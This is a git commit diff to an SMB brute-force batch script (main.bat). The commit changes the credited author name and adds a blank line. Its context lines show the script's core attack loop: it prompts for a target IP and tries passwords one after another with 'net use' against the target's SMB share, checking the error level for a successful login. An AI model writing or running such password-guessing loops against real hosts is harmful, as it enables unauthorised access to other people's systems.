69d148b9b406df7784c75cb12a9d16b32a0c8493
shadowGTVR <loganousby@gmail.com>
2025-11-22 17:45:02 -0800

    .

--- main.bat
+++ main.bat
@@ -1,5 +1,5 @@
 @echo off
-title SMB Bruteforce - by Ebola Man
+title SMB Bruteforce - by ikulikeghostface
 color A
 echo.
 set /p ip="Enter IP Address: "
@@ -26,4 +26,5 @@ exit
 net use \\%ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
+
 if %errorlevel% EQU 0 goto success
